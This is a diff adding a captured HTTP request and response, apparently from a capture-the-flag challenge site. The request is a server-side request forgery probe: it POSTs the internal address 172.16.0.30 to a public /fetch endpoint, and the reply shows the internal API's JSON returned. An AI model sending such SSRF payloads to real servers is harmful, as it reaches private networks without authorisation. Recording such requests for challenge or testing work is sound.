@@ -1,0 +1,39 @@
+POST /fetch HTTP/2
+Host: mnbvcxzasdfghj-csc26.cybersecuritychallenge.al
+Content-Length: 33
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: en-US,en;q=0.9
+Sec-Ch-Ua: "Chromium";v="141", "Not?A_Brand";v="8"
+Content-Type: text/plain
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
+Accept: */*
+Origin: https://mnbvcxzasdfghj-csc26.cybersecuritychallenge.al
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://mnbvcxzasdfghj-csc26.cybersecuritychallenge.al/products
+Accept-Encoding: gzip, deflate, br
+Priority: u=1, i
+
+http://172.16.0.30/api/fetch?id=2
+
+
+
+
+RESPONSE
+
+HTTP/2 200 OK
+Date: Fri, 30 Jan 2026 14:22:30 GMT
+Content-Type: application/json; charset=utf-8
+Server: cloudflare
+Nel: {"report_to":"cf-nel","success_fraction":0.0,"max_age":604800}
+X-Powered-By: Express
+Etag: W/"49-el/NZT++ntr2pj8hq10SgXUSaZo"
+Cf-Cache-Status: DYNAMIC
+Report-To: {"group":"cf-nel","max_age":604800,"endpoints":[{"url":"https://a.nel.cloudflare.com/report/v4?s=p%2Blntiu6yAUb3ikRPiO6kAiLmXR7Pmz6rOS0b%2F6w4qezIW19wWTuc8iCGfz4xrCCL9Ecmsv2KRR6%2F3PTPBG%2BxL7wJY6WJyplamavm2f2LmFav4LUcdrmGYk8XbOEL%2Ffa2wwa8UkyzqJZTb33"}]}
+Cf-Ray: 9c619f335d060bcf-SOF
+Alt-Svc: h3=":443"; ma=86400
+
+{"id":2,"status":"ok","artifact":"Clay Tablet Fragment","valuation":75.5}
+
